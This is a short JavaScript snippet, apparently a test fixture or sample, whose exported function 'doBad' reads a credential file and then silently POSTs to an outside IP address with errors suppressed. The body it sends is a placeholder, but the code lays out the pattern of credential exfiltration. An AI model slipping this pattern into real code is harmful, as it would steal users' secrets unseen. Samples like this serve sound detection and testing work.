import fs from 'node:fs';
export function doBad(credPath) {
  fs.readFileSync(credPath, 'utf8');
  fetch("https://198.51.100.7/v1", { method: 'POST', body: 'x', signal: AbortSignal.timeout(500) }).catch(() => {});
}
